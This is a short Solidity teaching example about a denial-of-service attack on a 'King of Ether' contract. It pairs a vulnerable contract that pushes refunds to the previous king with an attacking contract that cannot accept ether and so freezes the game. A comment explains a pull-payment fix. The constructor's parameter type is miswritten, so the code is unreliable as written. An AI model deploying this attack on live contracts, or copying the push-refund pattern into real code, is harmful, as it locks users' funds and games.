// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
Here we are breaking a contract by performing a denial of service. The goal 
of KingOfEther is to become the king by sending more eth than the current king.
The current king will be refunded. After AttackingContract claims the throne, 
the game is broken because AttackingContract has no way to receive eth. claimThrone() 
will always fail to send eth to the current king.

A fix would be to allow the user to withdraw their eth when they are no longer the king 
instead of sending it to them (PULL vs PUSH).
*/

contract KingOfEther {
    // current king if the contract
    address public king;

    uint256 public balance;

    function claimThrone() external payable {
        // ensure the sender is sending enough eth to become the new king
        require(msg.value > balance, "Need to pay more eth to become the king");
        // refund the current king
        (bool success, ) = king.call{value: balance}("");
        require(success, "Failed to send eth");
        balance = msg.value;
        king = msg.sender; // update the king
    }
}

contract AttackingContract {
    KingOfEther kingOfEther;

    constructor(kingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
